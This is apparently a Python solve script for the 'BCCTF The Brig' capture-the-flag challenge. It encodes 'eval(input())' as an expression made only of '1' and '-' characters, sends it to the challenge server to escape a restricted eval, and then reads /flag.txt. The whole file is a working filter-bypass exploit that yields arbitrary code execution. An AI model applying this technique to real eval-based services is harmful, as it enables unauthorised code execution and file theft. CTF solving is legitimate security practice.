#!/usr/bin/env python3
import argparse
import re
import socket


def int_to_one_dash_expr(n: int) -> str:
    """
    Build a decimal place-value expression for n using only '1' and '-'.
    '+' is represented as '--' (subtracting a negative).
    """
    digits = list(map(int, str(n)[::-1]))  # least significant first
    digits.append(0)
    coeffs = [digits[i] - digits[i + 1] for i in range(len(digits) - 1)]

    terms: list[tuple[str, str]] = []
    for power, coeff in enumerate(coeffs, start=1):
        if coeff == 0:
            continue
        literal = "1" * power  # e.g. 111 == 10^3 - 1 * scale trick with coeff diffs
        if coeff > 0:
            terms.extend([("+", literal)] * coeff)
        else:
            terms.extend([("-", literal)] * (-coeff))

    if not terms:
        return "1-1"

    sign, literal = terms[0]
    expr = literal if sign == "+" else "-" + literal
    for sign, literal in terms[1:]:
        expr += ("--" if sign == "+" else "-") + literal
    return expr


def recv_some(sock: socket.socket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        except TimeoutError:
            break
    return b"".join(chunks)


def solve(host: str, port: int) -> str:
    stage2 = b"eval(input())"
    stage2_num = int.from_bytes(stage2, "big")
    expr = int_to_one_dash_expr(stage2_num)
    if not set(expr) <= {"1", "-"}:
        raise RuntimeError("Expression contains invalid symbols")
    if len(expr) >= 2**12:
        raise RuntimeError(f"Expression too long: {len(expr)}")

    with socket.create_connection((host, port), timeout=10) as sock:
        _ = recv_some(sock, timeout=1.0)  # banner + first prompt
        sock.sendall(b"1-\n")

        _ = recv_some(sock, timeout=1.0)  # taunt + second prompt
        sock.sendall(expr.encode() + b"\n")
        sock.sendall(b"open('/flag.txt').read()\n")

        out = recv_some(sock, timeout=2.0).decode("utf-8", "replace")

    match = re.search(r"BCCTF\{[^}\n]+\}", out)
    if not match:
        raise RuntimeError(f"Flag not found in response:\n{out}")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description="Solve BCCTF The Brig")
    parser.add_argument("--host", default="chal.bearcatctf.io")
    parser.add_argument("--port", type=int, default=36990)
    args = parser.parse_args()

    flag = solve(args.host, args.port)
    print(flag)


if __name__ == "__main__":
    main()
